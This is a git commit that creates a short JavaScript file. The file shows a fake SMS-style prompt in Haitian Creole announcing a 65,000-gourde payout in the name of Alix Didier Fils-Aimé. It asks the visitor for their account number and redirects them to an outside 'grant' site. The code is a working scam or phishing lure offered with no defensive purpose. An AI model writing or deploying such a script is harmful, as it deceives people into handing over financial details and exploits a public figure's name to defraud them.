6325ed3369f83dad4b8d43ddf5616a80f47f9e1e
The-On-going <sirpeelawson@gmail.com>
2026-05-14 19:31:16 +0100

    Create adeleke-active.js

---
+++ adeleke-active.js
@@ -0,0 +1,5 @@
+var password = 'RETIRE G 65,000'
+password=prompt('SMS: Felisitasyon, ou kalifye pou resevwa G 65,000 nan men Alix Didier Fils-Aimé, klike OK pou antre nimewo kont ou','RETIRE G 65,000');
+if (password != 'RETIRE G 65,000') {
+location.href='https://ongoing-grant.info/Alix-Didier-Anivese-Nesans.html';
+}
